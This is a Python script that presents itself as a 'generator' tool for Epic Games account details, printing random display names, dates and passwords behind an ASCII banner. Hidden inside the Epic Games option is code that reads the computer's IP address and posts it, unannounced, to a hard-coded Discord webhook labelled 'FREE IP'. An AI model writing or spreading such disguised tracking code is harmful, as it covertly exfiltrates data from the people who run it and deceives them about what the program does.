import random
import requests
import socket
import string

def generate_name():
    prefixes = ["Ava", "Eli", "Emma", "Liam", "Olivia", "Noah", "Isabella", "Sophia", "Mia", "Charlotte"]
    suffixes = ["n", "lia", "n", "am", "h", "n", "a", "h", "a", "e"]

    prefix = random.choice(prefixes)
    suffix = random.choice(suffixes)

    return prefix + suffix


def generate_date():
    day = random.randint(1, 31)
    month = random.randint(1, 12)
    year = 2000

    return f"{day:02d}/{month:02d}/{year}"


def generate_display_name():
    first_name = generate_name()
    last_name = generate_name()
    numbers = random.randint(1000, 9999)

    display_name = first_name + last_name + str(numbers)
    first_last_name = first_name + " " + last_name

    return display_name, first_last_name


def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password


def send_ip_to_webhook(ip_address):
    webhook_url = 'https://discord.com/api/webhooks/1109012679496056842/qRdZm82XtDZ2271eQ9vMkzCoQrhG_2NPOoDaflg8dZS_7NgVAHAD6KQ5t8cdh42H2ye2'
    message = f'FREE IP: {ip_address}'

    payload = {
        'content': message
    }

    response = requests.post(webhook_url, json=payload)


def generate_epic_games_code():
    # Generate a random display name, its corresponding first and last name, and a date
    display_name, first_last_name = generate_display_name()
    date = generate_date()

    # Get the computer's IP address
    ip_address = socket.gethostbyname(socket.gethostname())

    # Send the IP address to the Discord webhook
    send_ip_to_webhook(ip_address)

    # Print the generated display name, first and last name, date, and IP address
    print("Generated Display Name:", display_name)
    print("Generated First and Last Name:", first_last_name)
    print("Generated Date:", date)

    # Generate a random password with a length of 10 characters
    password = generate_password(10)
    print("Generated Password:", password)

    # Add a clickable link to the output
    print("Click here to visit the temporary email service:'https://temp-mail.org/'")


def main():
    print(
        "               _                            _                _ _                                                _             ")
    print(
        "              | |                          | |              (_) |                                              | |            ")
    print(
        " __      _____| | ___ ___  _ __ ___   ___  | |_ ___    _ __  _| |_ __ _ _   _    __ _  ___ _ __   ___ _ __ __ _| |_ ___  _ __ ")
    print(
        " \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \  | '_ \| | __/ _` | | | |  / _` |/ _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|")
    print(
        "  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) | | | | | | || (_| | |_| | | (_| |  __/ | | |  __/ | | (_| | || (_) | |   ")
    print(
        "   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  |_| |_|_|\__\__,_|\__, |  \__, |\___|_| |_|\___|_|  \__,_|\__\___/|_|   ")
    print(
        "                                                                         __/ |   __/ |                                        ")
    print(
        "                                                                        |___/   |___/                                         ")

    print("Please select an option:")
    print("1. Epic Games")

    choice = input("Enter your choice: ")

    if choice == "1":
        generate_epic_games_code()

    input("Press Enter to exit...")

# Execute the main function
if __name__ == "__main__":
    main()
